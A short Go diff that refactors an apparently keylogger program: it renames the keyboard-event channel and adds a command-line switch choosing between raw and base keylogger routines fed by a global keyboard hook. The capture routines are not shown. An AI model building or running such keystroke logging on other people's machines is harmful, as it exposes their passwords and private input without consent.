@@ -24,9 +24,9 @@ func main() {
 
 func run() error {
 	// Buffer size is depends on your need. The 100 is placeholder value.
-	keyboardChan := make(chan types.KeyboardEvent, 100)
+	keyboardChannel := make(chan types.KeyboardEvent, 100)
 
-	if err := keyboard.Install(nil, keyboardChan); err != nil {
+	if err := keyboard.Install(nil, keyboardChannel); err != nil {
 		return err
 	}
 
@@ -37,7 +37,17 @@ func run() error {
 
 	fmt.Println("ready")
 
-	go keylogger.RawKeyLogger(keyboardChan)
+	loggerRoutine := keylogger.RawKeyLogger
+	if len(os.Args) > 1 {
+		switch os.Args[1] {
+		case "raw":
+			loggerRoutine = keylogger.RawKeyLogger
+		case "base":
+			loggerRoutine = keylogger.BaseKeyLogger
+		}
+	}
+
+	go loggerRoutine(keyboardChannel)
 
 	for {
 		select {
